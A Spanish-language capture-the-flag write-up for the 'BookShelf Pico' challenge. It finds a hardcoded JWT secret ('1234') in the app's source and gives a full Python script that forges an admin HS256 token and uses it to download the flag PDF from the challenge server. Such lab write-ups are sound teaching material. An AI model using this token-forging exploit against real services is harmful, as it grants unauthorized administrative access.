## Descripcion
BookShelf Pico, my premium online book-reading service.

I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book!
## Solucion
### 1. Primero verifica tu carpeta

Desde donde descomprimiste el reto:

```
cd bookshelf-pico

find . -type f -name "*.java" | sort
```

Deberías encontrar algo parecido a:

```
./src/main/java/io/github/nandandesai/pico/BookShelfBaseServerApplication.java
./src/main/java/io/github/nandandesai/pico/configs/...
./src/main/java/io/github/nandandesai/pico/controllers/...
./src/main/java/io/github/nandandesai/pico/security/JwtService.java
./src/main/java/io/github/nandandesai/pico/security/SecretGenerator.java
./src/main/java/io/github/nandandesai/pico/services/BookService.java
./src/main/java/io/github/nandandesai/pico/services/UserService.java
```

Así que los dos archivos que estás viendo son simplemente los que están dentro de:

```
pico/services/
```

Busca directamente el secreto con:

```
grep -Rni "1234\|SecretGenerator\|SECRET_KEY" .
```

La vulnerabilidad está en `SecretGenerator.java`, donde el supuesto valor aleatorio termina siendo `1234`.

---

# 2. Script Python para automatizar el exploit

Este no necesita `jwt.io` ni `PyJWT`; utiliza solamente librerías estándar de Python.

Guárdalo como:

```
nano exploit.py
```

y pega:

```
import json
import base64
import hashlib
import hmac
import time
import requests
import re

HOST = "http://chatelaine.cylabacademy.net:15918"

SECRET = "1234"

def base64url(data):
    return base64.urlsafe_b64encode(data).decode().replace("=", "")

# ---------------------------------
# 1. Crear Header JWT
# ---------------------------------

header = {
    "typ": "JWT",
    "alg": "HS256"
}

# ---------------------------------
# 2. Crear Payload
# ---------------------------------

ahora = int(time.time())

payload = {
    "role": "Admin",
    "iss": "bookshelf",
    "iat": ahora,
    "exp": ahora + 3600,
    "userId": 2,
    "email": "admin"
}

header_b64 = base64url(
    json.dumps(header, separators=(",", ":")).encode()
)

payload_b64 = base64url(
    json.dumps(payload, separators=(",", ":")).encode()
)

mensaje = header_b64 + "." + payload_b64

# ---------------------------------
# 3. Firmar JWT con HS256
# ---------------------------------

firma = hmac.new(
    SECRET.encode(),
    mensaje.encode(),
    hashlib.sha256
).digest()

firma_b64 = base64url(firma)

token = mensaje + "." + firma_b64

print("\n[+] JWT generado:")
print(token)

print("\n[+] Payload:")
print(json.dumps(payload, indent=4))

# ---------------------------------
# 4. Crear sesión
# ---------------------------------

session = requests.Session()

headers = {
    "Authorization": "Bearer " + token,
    "User-Agent": "Mozilla/5.0"
}

# ---------------------------------
# 5. Consultar libros
# ---------------------------------

print("\n[+] Consultando libros...")

respuesta = session.get(
    HOST + "/base/books",
    headers=headers
)

print("[+] Status:", respuesta.status_code)

try:
    libros = respuesta.json()

    print("\n[+] Libros encontrados:")
    print(json.dumps(libros, indent=4))

except:
    print("[-] La respuesta no era JSON")
    libros = None

# ---------------------------------
# 6. Descargar Flag
# ---------------------------------

print("\n[+] Intentando descargar Flag...")

respuesta = session.get(
    HOST + "/base/books/pdf/5",
    headers=headers
)

print("[+] Status PDF:", respuesta.status_code)

if respuesta.status_code == 200:

    with open("flag.pdf", "wb") as archivo:
        archivo.write(respuesta.content)

    print("[+] PDF guardado como flag.pdf")

    # ---------------------------------
    # 7. Buscar picoCTF directamente
    # ---------------------------------

    contenido = respuesta.content.decode(
        "latin-1",
        errors="ignore"
    )

    banderas = re.findall(
        r"picoCTF\{[^}]+\}",
        contenido
    )

    if len(banderas) > 0:

        print("\n================================")
        print("FLAG ENCONTRADA:")
        print(banderas[0])
        print("================================")

    else:

        print("\n[-] No se encontró la bandera directamente.")
        print("[+] Usa strings para revisar el PDF:")

        print("\nstrings flag.pdf | grep picoCTF")

else:

    print("\n[-] No se pudo descargar el PDF.")
    print("\nRespuesta del servidor:")
    print(respuesta.text[:2000])
```

---

# 3. Instala `requests`

```
pip install requests
```

En Kali puede ser necesario:

```
pip install --break-system-packages requests
```

---

# 4. Ejecuta

```
python3 exploit.py
```

El script primero construye:

```
{
    "role": "Admin",
    "iss": "bookshelf",
    "iat": 0,
    "exp": 0,
    "userId": 2,
    "email": "admin"
}
```

Los valores de `iat` y `exp` los calcula automáticamente.

Después lo firma con:

```
1234
```

usando:

```
HS256
```

y finalmente hace:

```
GET /base/books
```

y:

```
GET /base/books/pdf/5
```

El endpoint `/base/books/pdf/{id}` y que el libro de la bandera corresponde al ID `5` están documentados en writeups del reto.

---

# 5. Si descarga el PDF pero no encuentra el texto

Haz:

```
strings flag.pdf | grep academy
```

## Notas adicionales

## Referencias
